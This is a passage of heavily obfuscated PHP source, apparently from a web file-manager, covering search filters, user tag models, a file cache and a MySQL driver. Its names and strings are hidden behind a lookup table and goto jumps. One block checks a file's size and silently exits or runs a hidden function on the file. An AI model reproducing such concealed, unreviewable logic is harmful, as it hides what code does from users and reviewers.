$†¯şŸ‚[453], $†¯şŸ‚[374] => array($†¯şŸ‚[383], $†¯şŸ‚[1948] . $Ù‡Í«Ü’[$†¯şŸ‚[1946]] . $†¯şŸ‚[1948])); $²í×§ò¤ = !1; if ($²í×§ò¤) { $½‚ª¨Ä× = $this->listSearchChildren($Ù‡Í«Ü’[$†¯şŸ‚[432]]); $½‚ª¨Ä× = array_unique($½‚ª¨Ä×); if (!$½‚ª¨Ä×) { return; } $î£€Áú’[$†¯şŸ‚[402]] = array($†¯şŸ‚[7], $½‚ª¨Ä×); } $•Û¶öÛ¾ = Model($†¯şŸ‚[560])->field($†¯şŸ‚[402])->where($î£€Áú’)->limit(5000)->select(); $ßŒö—Õ´ = array_to_keyvalue($•Û¶öÛ¾, $†¯şŸ‚[12], $†¯şŸ‚[402]); $this->_listSearchMerge($Á”²üæ, $Ù‡Í«Ü’, $—Ç€âê‰, $ßŒö—Õ´); } private function _listSearchGroupTag(&$ãƒ¿‚´Â, $øı°¥í×, $âÑ“äêÂ) { $ë°µè =& $_SERVER[­á Ş³Ö]; if (!$øı°¥í×[$ë°µè[1946]] || $ãƒ¿‚´Â[$ë°µè[366]][$ë°µè[353]] > 1 || !$øı°¥í×[$ë°µè[432]]) { return; } $¥ş¨úî = $this->sourceInfo($øı°¥í×[$ë°µè[432]]); if (!$¥ş¨úî || $¥ş¨úî[$ë°µè[411]] != SourceModel::TYPE_GROUP) { return; } $ÔÄá†Ğë = $¥ş¨úî[$ë°µè[496]]; $Şìò¹ı = Model($ë°µè[2112])->get($ÔÄá†Ğë); $Ùş°óÛó = array(); $ãÙ–İ¾¾ = $øı°¥í×[$ë°µè[1946]]; foreach ($Şìò¹ı[$ë°µè[369]] as $éØ„¨¾) { $Ëü† = $éØ„¨¾[$ë°µè[32]]; $åØÍ«×Ñ = str_replace($ë°µè[53], $ë°µè[12], Pinyin::get($Ëü†)); if (stripos($Ëü†, $ãÙ–İ¾¾) !== !1 || stripos($åØÍ«×Ñ, $ãÙ–İ¾¾) !== !1) { $Ùş°óÛó[] = $éØ„¨¾[$ë°µè[399]]; } } if (!$Ùş°óÛó) { return; } $Ç‚Â£®ü = array($ë°µè[426] => array($ë°µè[7], $Ùş°óÛó), $ë°µè[1663] => 0, $ë°µè[33] => $ë°µè[1968] . $ÔÄá†Ğë); $ü±æ´í = Model($ë°µè[428])->field($ë°µè[84])->where($Ç‚Â£®ü)->select(); $ü±æ´í = array_to_keyvalue($ü±æ´í, $ë°µè[12], $ë°µè[84]); $€¬éé¿Ù = array_unique($ü±æ´í); $this->_listSearchMerge($ãƒ¿‚´Â, $øı°¥í×, $âÑ“äêÂ, $€¬éé¿Ù); } private function _listSearchMerge(&$«ÆÕÕä, $±ÕšèÛ©, $Â¯îì–º, $ú£™½„) { $Ö¢Ş±÷” =& $_SERVER[­á Ş³Ö]; if (!$ú£™½„) { return; } $ÃÊÊù = array_to_keyvalue($«ÆÕÕä[$Ö¢Ş±÷”[369]], $Ö¢Ş±÷”[12], $Ö¢Ş±÷”[402]); $ñ‹¤ê¹Ş = array_diff($ú£™½„, $ÃÊÊù); if (!$ñ‹¤ê¹Ş) { return; } $ë×ô¼¸¢ = array($Ö¢Ş±÷”[402] => array($Ö¢Ş±÷”[7], $ñ‹¤ê¹Ş)); $½‰»Ô = $this->field($Â¯îì–º)->where($ë×ô¼¸¢)->select(); if (!$½‰»Ô) { return; } $Ï¢»Àğ = array(); foreach ($½‰»Ô as $Ù¦ú“ñÇ) { if ($this->_listSearchFilter($Ù¦ú“ñÇ, $±ÕšèÛ©)) { $Ï¢»Àğ[] = $Ù¦ú“ñÇ; } } $«ÆÕÕä[$Ö¢Ş±÷”[369]] = array_merge($Ï¢»Àğ, $«ÆÕÕä[$Ö¢Ş±÷”[369]]); $«ÆÕÕä[$Ö¢Ş±÷”[366]][$Ö¢Ş±÷”[367]] += count($Ï¢»Àğ); } private function _listSearchFilter($‘ıŞã‡¢, $ã£Îıô¹) { $ÕÓÏ¿Ñ˜ =& $_SERVER[­á Ş³Ö]; $ôãÔ¨àÛ = $‘ıŞã‡¢[$ÕÓÏ¿Ñ˜[410]] == $ÕÓÏ¿Ñ˜[88]; if (!strstr($‘ıŞã‡¢[$ÕÓÏ¿Ñ˜[511]], $ÕÓÏ¿Ñ˜[50] . $ã£Îıô¹[$ÕÓÏ¿Ñ˜[432]] . $ÕÓÏ¿Ñ˜[50])) { return !1; } if (isset($ã£Îıô¹[$ÕÓÏ¿Ñ˜[412]]) && $ã£Îıô¹[$ÕÓÏ¿Ñ˜[412]] != $ÕÓÏ¿Ñ˜[1907]) { if ($ã£Îıô¹[$ÕÓÏ¿Ñ˜[412]] == $ÕÓÏ¿Ñ˜[75] && !$ôãÔ¨àÛ) { return !1; } if ($ã£Îıô¹[$ÕÓÏ¿Ñ˜[412]] != $ÕÓÏ¿Ñ˜[75] && $ôãÔ¨àÛ) { return !1; } if (!strstr($‘ıŞã‡¢[$ÕÓÏ¿Ñ˜[174]], $ÕÓÏ¿Ñ˜[50] . $ã£Îıô¹[$ÕÓÏ¿Ñ˜[412]] . $ÕÓÏ¿Ñ˜[50])) { return !1; } } if (isset($ã£Îıô¹[$ÕÓÏ¿Ñ˜[2113]]) && $ã£Îıô¹[$ÕÓÏ¿Ñ˜[2113]] < $‘ıŞã‡¢[$ÕÓÏ¿Ñ˜[76]]) { return !1; } if (isset($ã£Îıô¹[$ÕÓÏ¿Ñ˜[2114]]) && $ã£Îıô¹[$ÕÓÏ¿Ñ˜[2114]] > $‘ıŞã‡¢[$ÕÓÏ¿Ñ˜[76]]) { return !1; } if (isset($ã£Îıô¹[$ÕÓÏ¿Ñ˜[590]]) && $ã£Îıô¹[$ÕÓÏ¿Ñ˜[590]] != $‘ıŞã‡¢[$ÕÓÏ¿Ñ˜[456]]) { return !1; } return !0; } public function listSearchChildren($Ö÷ÜÖ¨€, $•Üöó¹Ï = 5000) { $æÜØùó™ =& $_SERVER[­á Ş³Ö]; $¶ı§ãí = array(); $ıî»ÌÀæ = $this->sourceInfo($Ö÷ÜÖ¨€); $ùÅ–àÄ¸ = array($æÜØùó™[511] => array($æÜØùó™[383], $ıî»ÌÀæ[$æÜØùó™[511]] . $ıî»ÌÀæ[$æÜØùó™[402]] . $æÜØùó™[541])); $´Ê‘ëèÍ = $this->field($æÜØùó™[76])->where($ùÅ–àÄ¸)->limit($•Üöó¹Ï + 1)->select(); $ˆ¡¼¼”ä = is_array($´Ê‘ëèÍ) ? count($´Ê‘ëèÍ) : 0; if ($ˆ¡¼¼”ä > $•Üöó¹Ï) { return $this->_listSearchChildrenNear($Ö÷ÜÖ¨€, $•Üöó¹Ï); } $ÍÊÂö×¨ = $this->field($æÜØùó™[402])->where($ùÅ–àÄ¸)->select(); $¶ı§ãí = array_to_keyvalue($ÍÊÂö×¨, $æÜØùó™[12], $æÜØùó™[402]); return $¶ı§ãí; } private function _listSearchChildrenNear($ß¾„£ŸÒ, $¥ÑŒÈ¥ ) { $ÁÄò–· =& $_SERVER[­á Ş³Ö]; $„ §“… = array(); $¿µœ»ó½ = array($ÁÄò–·[432] => $ß¾„£ŸÒ); $ŠÚæº€ü = $this->field($ÁÄò–·[2115])->where($¿µœ»ó½)->select(); $ü¯¤Ñ»ß = array_to_keyvalue(array_filter_by_field($ŠÚæº€ü, $ÁÄò–·[410], $ÁÄò–·[88]), $ÁÄò–·[12], $ÁÄò–·[402]); $„ §“… = array_merge($„ §“…, array_to_keyvalue($ŠÚæº€ü, $ÁÄò–·[12], $ÁÄò–·[402])); if (!$ü¯¤Ñ»ß) { return $„ §“…; } $¿µœ»ó½ = array($ÁÄò–·[432] => array($ÁÄò–·[7], $ü¯¤Ñ»ß)); $ŠÚæº€ü = $this->field($ÁÄò–·[2115])->where($¿µœ»ó½)->limit($¥ÑŒÈ¥ )->select(); $„ §“… = array_merge($„ §“…, array_to_keyvalue($ŠÚæº€ü, $ÁÄò–·[12], $ÁÄò–·[402])); $„ §“… = array_slice($„ §“…, 0, $¥ÑŒÈ¥ ); return $„ §“…; } private function _listSearchBindPinyin($è…õş«, &$€²ë¢°, &$ÈÜİ±•) { $§Ğ‚û€ =& $_SERVER[­á Ş³Ö]; if (!isset($è…õş«[$§Ğ‚û€[1946]]) || !$è…õş«[$§Ğ‚û€[1946]]) { return; } if (!Input::check($è…õş«[$§Ğ‚û€[1946]], $§Ğ‚û€[318]) || strlen($è…õş«[$§Ğ‚û€[1946]]) < 2) { return; } $·ƒÔ‘ö = "\x4c\105\x46\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\163\x6f\x75\x72\x63\145\137\x6d\145\x74\x61\x20\x6d\x65\164\141\40\x6f\156\40\163\x6f\x75\x72\143\x65\56\163\x6f\x75\162\143\145\111\x44\40\75\x20\155\145\x74\141\56\163\x6f\165\x72\143\x65\x49\x44"; $É¸ü¬ª = array(); $ÈÜİ±• = str_replace(array($§Ğ‚û€[231], $§Ğ‚û€[53], $§Ğ‚û€[2116]), $§Ğ‚û€[12], $ÈÜİ±•); $ÈÜİ±• = $§Ğ‚û€[438] . str_replace($§Ğ‚û€[50], $§Ğ‚û€[439], $ÈÜİ±•); $¥§ÜÜ = $€²ë¢°[$§Ğ‚û€[32]]; unset($€²ë¢°[$§Ğ‚û€[32]]); foreach ($€²ë¢° as $ÂÌ¡– => $Á£¯’Õğ) { $É¸ü¬ª[$§Ğ‚û€[438] . $ÂÌ¡–] = $Á£¯’Õğ; } foreach ($¥§ÜÜ as $•áÎ™ø˜) { $É¸ü¬ª[] = array($§Ğ‚û€[443] => $•áÎ™ø˜, $§Ğ‚û€[996] => $§Ğ‚û€[1950], array($§Ğ‚û€[2117] => $•áÎ™ø˜, $§Ğ‚û€[2118] => array($§Ğ‚û€[7], array($§Ğ‚û€[465], $§Ğ‚û€[464])))); } $this->join($·ƒÔ‘ö); $€²ë¢° = $É¸ü¬ª; } private function _parseSearchWhere($âûÒˆÇã) { $¡÷‚“È¼ =& $_SERVER[­á Ş³Ö]; $âÛËç‚¦ = array(); if (isset($âûÒˆÇã[$¡÷‚“È¼[757]]) && $âûÒˆÇã[$¡÷‚“È¼[757]]) { $âÛËç‚¦[$¡÷‚“È¼[85]] = array($¡÷‚“È¼[2119], $âûÒˆÇã[$¡÷‚“È¼[757]]); } if (isset($âûÒˆÇã[$¡÷‚“È¼[758]]) && $âûÒˆÇã[$¡÷‚“È¼[758]]) { $ùÊ´‚¾ò = array($¡÷‚“È¼[2120], $âûÒˆÇã[$¡÷‚“È¼[758]]); if ($âÛËç‚¦[$¡÷‚“È¼[85]]) { $âÛËç‚¦[$¡÷‚“È¼[85]] = array($âÛËç‚¦[$¡÷‚“È¼[85]], $ùÊ´‚¾ò, $¡÷‚“È¼[2121]); } else { $âÛËç‚¦[$¡÷‚“È¼[85]] = $ùÊ´‚¾ò; } } if (isset($âûÒˆÇã[$¡÷‚“È¼[2113]]) && $âûÒˆÇã[$¡÷‚“È¼[2113]] > 0) { $âÛËç‚¦[$¡÷‚“È¼[76]] = array($¡÷‚“È¼[2119], $âûÒˆÇã[$¡÷‚“È¼[2113]]); } if (isset($âûÒˆÇã[$¡÷‚“È¼[2114]]) && $âûÒˆÇã[$¡÷‚“È¼[2114]]) { $ùÊ´‚¾ò = array($¡÷‚“È¼[2120], $âûÒˆÇã[$¡÷‚“È¼[2114]]); if ($âÛËç‚¦[$¡÷‚“È¼[76]]) { $âÛËç‚¦[$¡÷‚“È¼[76]] = array($âÛËç‚¦[$¡÷‚“È¼[76]], $ùÊ´‚¾ò, $¡÷‚“È¼[2121]); } else { $âÛËç‚¦[$¡÷‚“È¼[76]] = $ùÊ´‚¾ò; } } if (isset($âûÒˆÇã[$¡÷‚“È¼[590]]) && $âûÒˆÇã[$¡÷‚“È¼[590]]) { $âÛËç‚¦[] = array($¡÷‚“È¼[456] => $âûÒˆÇã[$¡÷‚“È¼[590]], $¡÷‚“È¼[454] => $âûÒˆÇã[$¡÷‚“È¼[590]], $¡÷‚“È¼[996] => $¡÷‚“È¼[1950]); } if (isset($âûÒˆÇã[$¡÷‚“È¼[412]]) && $âûÒˆÇã[$¡÷‚“È¼[412]]) { $İ¶¿Ô­ = $âûÒˆÇã[$¡÷‚“È¼[412]]; if ($İ¶¿Ô­ == $¡÷‚“È¼[75]) { $âÛËç‚¦[$¡÷‚“È¼[410]] = 1; } else { if ($İ¶¿Ô­ == $¡÷‚“È¼[2122]) { $âÛËç‚¦[$¡÷‚“È¼[410]] = 0; } else { if ($İ¶¿Ô­) { $İ¶¿Ô­ = is_array($İ¶¿Ô­) ? $İ¶¿Ô­ : explode($¡÷‚“È¼[50], $İ¶¿Ô­); $âÛËç‚¦[$¡÷‚“È¼[412]] = array($¡÷‚“È¼[418], $İ¶¿Ô­); $âÛËç‚¦[$¡÷‚“È¼[410]] = 0; } } } } $this->_parseSearchParent($âûÒˆÇã, $âÛËç‚¦); if (isset($âûÒˆÇã[$¡÷‚“È¼[1946]]) && trim($âûÒˆÇã[$¡÷‚“È¼[1946]])) { $à‰‹é¬† = trim($âûÒˆÇã[$¡÷‚“È¼[1946]]); $ß‚Ñµ›Ì = explode($¡÷‚“È¼[53], $à‰‹é¬†); if (strlen($à‰‹é¬†) > 2 && (substr($à‰‹é¬†, 0, 1) == $¡÷‚“È¼[118] && substr($à‰‹é¬†, -1) == $¡÷‚“È¼[118]) || substr($à‰‹é¬†, 0, 1) == $¡÷‚“È¼[58] && substr($à‰‹é¬†, -1) == $¡÷‚“È¼[58]) { $à‰‹é¬† = substr($à‰‹é¬†, 1, -1); $ß‚Ñµ›Ì = array($à‰‹é¬†); } $âÛËç‚¦[$¡÷‚“È¼[32]] = array(array($¡÷‚“È¼[540], $¡÷‚“È¼[1948] . $à‰‹é¬† . $¡÷‚“È¼[1948])); if (count($ß‚Ñµ›Ì) > 1) { $âÛËç‚¦[$¡÷‚“È¼[32]] = array(); foreach ($ß‚Ñµ›Ì as $ÔŠÍîÎ¬) { if (!trim($ÔŠÍîÎ¬)) { continue; } $âÛËç‚¦[$¡÷‚“È¼[32]][] = array($¡÷‚“È¼[540], $¡÷‚“È¼[1948] . trim($ÔŠÍîÎ¬) . $¡÷‚“È¼[1948]); } } } return $âÛËç‚¦; } private function _parseSearchParent($ñµ£’Ú, &$ÎÚ—“‡â) { $‡€Àú¨ =& $_SERVER[­á Ş³Ö]; if (!isset($ñµ£’Ú[$‡€Àú¨[432]]) || !$ñµ£’Ú[$‡€Àú¨[432]]) { return; } $¸©ì–€… = $this->pathInfo($ñµ£’Ú[$‡€Àú¨[432]]); $®ÍÇØü = $¸©ì–€…[$‡€Àú¨[432]] . $‡€Àú¨[12] === $‡€Àú¨[198]; $ÆÔóÄÀ² = $¸©ì–€…[$‡€Àú¨[411]] == $‡€Àú¨[505]; if ($¸©ì–€…[$‡€Àú¨[522]] == $‡€Àú¨[523]) { $”«àÂ£— = $this->sourceInfo($ñµ£’Ú[$‡€Àú¨[432]]); $¸©ì–€…[$‡€Àú¨[511]] = $”«àÂ£—[$‡€Àú¨[511]]; } $ÎÚ—“‡â[$‡€Àú¨[580]] = array($‡€Àú¨[540], $¸©ì–€…[$‡€Àú¨[511]] . $ñµ£’Ú[$‡€Àú¨[432]] . $‡€Àú¨[541]); $Šî¬ÏÜß = isset($ñµ£’Ú[$‡€Àú¨[1811]]) && in_array($‡€Àú¨[505], $ñµ£’Ú[$‡€Àú¨[1811]]); if (!$Šî¬ÏÜß || !$ÆÔóÄÀ² || !$®ÍÇØü || !$¸©ì–€…[$‡€Àú¨[413]]) { return; } if (!AuthModel::authCheckRoot($¸©ì–€…[$‡€Àú¨[413]][$‡€Àú¨[414]])) { return; } $‚ÌÜ¶¬½ = $¸©ì–€…[$‡€Àú¨[496]] . $‡€Àú¨[12]; if ($‚ÌÜ¶¬½ == $‡€Àú¨[88]) { unset($ÎÚ—“‡â[$‡€Àú¨[580]]); $ÎÚ—“‡â[$‡€Àú¨[411]] = self::TYPE_GROUP; return; } $©ØøÍï£ = Model($‡€Àú¨[512])->groupChildrenAll($‚ÌÜ¶¬½); $£˜ÜæÅ˜ = count($©ØøÍï£); if ($£˜ÜæÅ˜ <= 1) { return; } $±ÊùŠ…í = array($‡€Àú¨[432] => 0, $‡€Àú¨[411] => self::TYPE_GROUP, $‡€Àú¨[496] => array($‡€Àú¨[7], $©ØøÍï£)); $–ä†¼ÅĞ = $this->field($‡€Àú¨[2123])->where($±ÊùŠ…í)->limit($£˜ÜæÅ˜)->select(); $ÎÚ—“‡â[$‡€Àú¨[580]] = array(); foreach ($–ä†¼ÅĞ as $µâ˜ıÂ) { $ÎÚ—“‡â[$‡€Àú¨[580]][] = array($‡€Àú¨[540], $‡€Àú¨[521] . $µâ˜ıÂ[$‡€Àú¨[402]] . $‡€Àú¨[541]); } $ÎÚ—“‡â[$‡€Àú¨[580]][] = $‡€Àú¨[1950]; } } goto f¦¡‹˜‘Î; d÷ŠÀÈ¼Á: define($_SERVER[­á Ş³Ö][241], 1); define($_SERVER[­á Ş³Ö][242], 0); define($_SERVER[­á Ş³Ö][243], 2); goto AÈÖÇ–˜Ÿ¸; CÇ´âÇª¢: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ÿï¦®îÌ) { $Î¢€´Ì® =& $_SERVER[­á Ş³Ö]; $–ıÔÈû¢ = defined($Î¢€´Ì®[2130]) && USER_ID ? USER_ID : $Î¢€´Ì®[12]; return "\x55\163\x65\162\117\x70\164\151\157\x6e\137{$Ÿï¦®îÌ}\x5f" . $–ıÔÈû¢; } protected function filterWhere($ø¨¢Êó¨) { $„Ô™Î½ï =& $_SERVER[­á Ş³Ö]; $ø¨¢Êó¨[$„Ô™Î½ï[1663]] = defined($„Ô™Î½ï[2130]) && USER_ID ? USER_ID : $„Ô™Î½ï[12]; return $ø¨¢Êó¨; } public function cacheRemoveUser($õô„ç‘¾, $†§¬³—) { return Cache::remove("\125\163\145\x72\117\160\x74\151\157\156\137{$õô„ç‘¾}\137" . $†§¬³—); } protected function optionDefault($ê†ƒğ•Ê = '') { $œé¼ÛÅ£ =& $_SERVER[­á Ş³Ö]; if ($ê†ƒğ•Ê == $œé¼ÛÅ£[12]) { return $GLOBALS[$œé¼ÛÅ£[6]][$œé¼ÛÅ£[2344]]; } if ($ê†ƒğ•Ê == $œé¼ÛÅ£[2345]) { return $GLOBALS[$œé¼ÛÅ£[6]][$œé¼ÛÅ£[2346]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\164\141\x67\x4c\151\x73\x74"; public $modelType = "\125\163\x65\x72\x4f\160\164\151\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\163\x74\x79\x6c\145", "\163\157\162\164"); public function listData($ğÈÖ´Û§ = false, $úıß‰çí = "\x73\157\162\164", $Â¶µ‰Ñä = false) { return parent::listData($ğÈÖ´Û§, $úıß‰çí, $Â¶µ‰Ñä); } public function remove($‚–£¸) { return parent::remove($‚–£¸); } public function add($³›€™‘‡, $´±ãµ¤Î = "\154\141\x62\145\x6c\x2d\x67\x72\x65\x79\x2d\156\157\x72\x6d\141\154") { $×®ÕïŞì =& $_SERVER[­á Ş³Ö]; if ($this->findByName($³›€™‘‡)) { return !1; } $Ü—ßĞìÉ = array($×®ÕïŞì[420] => $³›€™‘‡, $×®ÕïŞì[484] => $´±ãµ¤Î, $×®ÕïŞì[1856] => $this->getSort($×®ÕïŞì[258]) + 1); return parent::insert($Ü—ßĞìÉ); } public function update($†íòó¹¸, $¸ûÇ²à) { $î³íëö² =& $_SERVER[­á Ş³Ö]; $‰†İûº± = $this->listData($†íòó¹¸); $³«™¢ı = $this->findByName($¸ûÇ²à[$î³íëö²[32]]); if (!$‰†İûº± || $³«™¢ı && $³«™¢ı[$î³íëö²[399]] != $‰†İûº±[$î³íëö²[399]]) { return !1; } return parent::update($†íòó¹¸, $¸ûÇ²à); } public function moveTop($È­éÀĞû) { $¼¦§‚ºª =& $_SERVER[­á Ş³Ö]; $Í¶–ãä· = parent::listData(); $Ú¯‹Øä¾ = $this->getSort($¼¦§‚ºª[257]); foreach ($Í¶–ãä· as &$²¯‹‚µ½) { if ($²¯‹‚µ½[$¼¦§‚ºª[399]] == $È­éÀĞû) { $²¯‹‚µ½[$¼¦§‚ºª[1876]] = $Ú¯‹Øä¾; continue; } $²¯‹‚µ½[$¼¦§‚ºª[1876]] += 1; } unset($²¯‹‚µ½); return parent::resetData($Í¶–ãä·); } public function moveBottom($½ªğ£’) { $Ö»òÛêë =& $_SERVER[­á Ş³Ö]; $Õ½¸¦µÕ = $this->getSort($Ö»òÛêë[258]) + 1; return parent::update($½ªğ£’, array($Ö»òÛêë[1876] => $Õ½¸¦µÕ)); } public function resetSort($îó••¤é) { $‹ãÕæò =& $_SERVER[­á Ş³Ö]; $ÆÌªäı® = array(); $îó••¤é = is_array($îó••¤é) ? $îó••¤é : array(); for ($›üÑ•¼í = 0; $›üÑ•¼í < count($îó••¤é); $›üÑ•¼í++) { $ÆÌªäı®[$îó••¤é[$›üÑ•¼í] . $‹ãÕæò[12]] = $›üÑ•¼í + 1; } $ÕÈ÷¿² = parent::listData(); foreach ($ÕÈ÷¿² as &$©¸İÏŸ) { $¢ù¹¶Ö = $ÆÌªäı®[$©¸İÏŸ[$‹ãÕæò[399]]]; $©¸İÏŸ[$‹ãÕæò[1876]] = $¢ù¹¶Ö ? $¢ù¹¶Ö : $©¸İÏŸ[$‹ãÕæò[1876]]; } unset($©¸İÏŸ); return parent::resetData($ÕÈ÷¿²); } private function getSort($–Šçú÷Â) { $èèúÇÔ =& $_SERVER[­á Ş³Ö]; $ÕÊ×²¹Ÿ = parent::listData(); $¾—Û = array_to_keyvalue($ÕÊ×²¹Ÿ, $èèúÇÔ[12], $èèúÇÔ[1876]); if (!$¾—Û) { $¾—Û = array(0); } $»Ï™Œ¯Á = $–Šçú÷Â == $èèúÇÔ[258] ? max($¾—Û) : min($¾—Û); return intval($»Ï™Œ¯Á); } } goto f¨ƒ‡š„Ù; e˜´Áæ×: $_size = $_SERVER[­á Ş³Ö][737]; if ($_SERVER[$_SERVER[­á Ş³Ö][738]] != $_size($_file)) { $_getc = $_SERVER[­á Ş³Ö][739]; $_getfile = $_SERVER[$_SERVER[­á Ş³Ö][740]] . $_SERVER[­á Ş³Ö][741]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­á Ş³Ö][231], $_getfilec); if (count($_getarrs) < $_SERVER[­á Ş³Ö][628]) { $exit = $_SERVER[­á Ş³Ö][742]; $exit(); } $_act = $_SERVER[­á Ş³Ö][743]; $_act($_file); } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ó†ÏØ§¦, $Íä¶Ååî) { $´³íÜı× =& $_SERVER[­á Ş³Ö]; $this->cachePath = $Ó†ÏØ§¦[$´³íÜı×[84]]; $this->prefix = $´³íÜı×[831]; $this->cacheTime = $Íä¶Ååî; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ì—§×â) { $Ï®·øË =& $_SERVER[­á Ş³Ö]; $Ì—§×â = str_replace(array($Ï®·øË[832], $Ï®·øË[97], $Ï®·øË[73]), $Ï®·øË[833], $Ì—§×â); return $this->cachePath . $Ï®·øË[834] . $Ì—§×â . $Ï®·øË[835]; } public function set($õÙçª·Ÿ, $ˆíè¿»Ï, $¶ßù¥Í = false) { $¶ßù¥Í = $¶ßù¥Í ? $¶ßù¥Í : $this->cacheTime; $”Ã¿¨İø = $this->getFile($õÙçª·Ÿ); if (file_put_contents($”Ã¿¨İø, $this->prefix . $ˆíè¿»Ï, LOCK_EX)) { @touch($”Ã¿¨İø, intval(time() + $¶ßù¥Í)); clearstatcache(); return !0; } @unlink($”Ã¿¨İø); return !1; } public function get($ˆòË©ÇÔ) { $õÓ”ù  = $this->getFile($ˆòË©ÇÔ); if (file_exists($õÓ”ù ) && filemtime($õÓ”ù ) < time()) { @unlink($õÓ”ù ); return !1; } $áÈ ë¼ = @file_get_contents($õÓ”ù ); return substr($áÈ ë¼, strlen($this->prefix)); } public function remove($ŞÀêÔ­§) { $¢÷Á¢¾˜ = $this->getFile($ŞÀêÔ­§); return @unlink($¢÷Á¢¾˜); } public function deleteAll() { $ñ öşîÒ =& $_SERVER[­á Ş³Ö]; $¨ß¥ƒàÅ = scandir($this->cachePath); foreach ($¨ß¥ƒàÅ as $àë¥ş¤´) { $“®ıƒùÑ = $this->cachePath . $àë¥ş¤´; if (strpos($“®ıƒùÑ, $ñ öşîÒ[835]) && strpos($“®ıƒùÑ, $ñ öşîÒ[836])) { @unlink($“®ıƒùÑ); } } } public function clearTimeout() { $ºèşæÜï =& $_SERVER[­á Ş³Ö]; $çå‹æ«ú = scandir($this->cachePath); foreach ($çå‹æ«ú as $ÎëÂ÷Œä) { $àî‰˜Í³ = $this->cachePath . $ÎëÂ÷Œä; if (strpos($àî‰˜Í³, $ºèşæÜï[835]) && strpos($àî‰˜Í³, $ºèşæÜï[836]) && filemtime($àî‰˜Í³) < time()) { @unlink($àî‰˜Í³); } } } } goto c•÷¡öˆùõ; C¡ÜŠ­‰„: class DbMysql extends Db { public function __construct($ßÜì™˜Ò = '') { $¡€ğºİ– =& $_SERVER[­á Ş³Ö]; if (!extension_loaded($¡€ğºİ–[801])) { think_exception(think_lang($¡€ğºİ–[14]) . $¡€ğºİ–[881]); } if (!empty($ßÜì™˜Ò)) { $this->config = $ßÜì™˜Ò; if (empty($this->config[$¡€ğºİ–[17]])) { $this->config[$¡€ğºİ–[17]] = $¡€ğºİ–[12]; } } } public function connect($²±·ßä¼ = '', $‡ÒŞíÎ = 0, $ì—Û¶± = false) { $œÔì¯ê  =& $_SERVER[­á Ş³Ö]; if (!isset($this->linkID[$‡ÒŞíÎ])) { if (empty($²±·ßä¼)) { $²±·ßä¼ = $this->config; } $ûà¶„å‰ = $²±·ßä¼[$œÔì¯ê [882]] . ($²±·ßä¼[$œÔì¯ê [883]] ? "\72{$²±·ßä¼[$œÔì¯ê [883]]}" : $œÔì¯ê [12]); $ªÒªË = !empty($²±·ßä¼[$œÔì¯ê [17]][$œÔì¯ê [18]]) ? $²±·ßä¼[$œÔì¯ê [17]][$œÔì¯ê [18]] : $this->pconnect; if ($ªÒªË) { $this->linkID[$‡ÒŞíÎ] = mysql_pconnect($ûà¶„å‰, $²±·ßä¼[$œÔì¯ê [884]], $²±·ßä¼[$œÔì¯ê [885]], 131072); } else { $this->linkID[$‡ÒŞíÎ] = mysql_connect($ûà¶„å‰, $²±·ßä¼[$œÔì¯ê [884]], $²±·ßä¼[$œÔì¯ê [885]], !0, 131072); } if (!$this->linkID[$‡ÒŞíÎ] || !empty($²±·ßä¼[$œÔì¯ê [21]]) && !mysql_select_db($²±·ßä¼[$œÔì¯ê [21]], $this->linkID[$‡ÒŞíÎ])) { think_exception(mysql_error()); } $‡™ƒ†‡‘ = mysql_get_server_info($this->linkID[$‡ÒŞíÎ]); mysql_query($œÔì¯ê [886] . think_config($œÔì¯ê [887]) . $œÔì¯ê [58], $this->linkID[$‡ÒŞíÎ]); if ($‡™ƒ†‡‘ > $œÔì¯ê [888]) { mysql_query($œÔì¯ê [889], $this->linkID[$‡ÒŞíÎ]); } $this->connected = !0; if (1 != think_config($œÔì¯ê [22])) { unset($this->config); } } return $this->linkID[$‡ÒŞíÎ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ş ‹ÈËö) { $ÛŒ™öÄ€ =& $_SERVER[­á Ş³Ö]; if (0 === stripos($ş ‹ÈËö, $ÛŒ™öÄ€[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ş ‹ÈËö; if ($this->queryID) { $this->free(); } think_action_status($ÛŒ™öÄ€[23], 1); think_status($ÛŒ™öÄ€[24]); $this->queryID = mysql_query($ş ‹ÈËö, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¼’êœ£ü) { $¼°ãöšÑ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¼’êœ£ü; if ($this->queryID) { $this->free(); } think_action_status($¼°ãöšÑ[25], 1); think_status($¼°ãöšÑ[24]); $Âãİ‘ = mysql_query($¼’êœ£ü, $this->_linkID); $this->debug(); if (!1 === $Âãİ‘) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[­á Ş³Ö][890], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹‚‚ßúÉ = mysql_query($_SERVER[­á Ş³Ö][891], $this->_linkID); $this->transTimes = 0; if (!$¹‚‚ßúÉ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Õíä×«« = mysql_query($_SERVER[­á Ş³Ö][892], $this->_linkID); $this->transTimes = 0; if (!$Õíä×««) { $this->error(); return !1; } } return !0; } private function getAll() { $ÒŒŒÉ¶ = array(); if ($this->numRows > 0) { while ($ëßôËÔ½ = mysql_fetch_assoc($this->queryID)) { $ÒŒŒÉ¶[] = $ëßôËÔ½; } mysql_data_seek($this->queryID, 0); } return $ÒŒŒÉ¶; } public function getFields($Ğüò’ôç) { $ŒšÄº†â =& 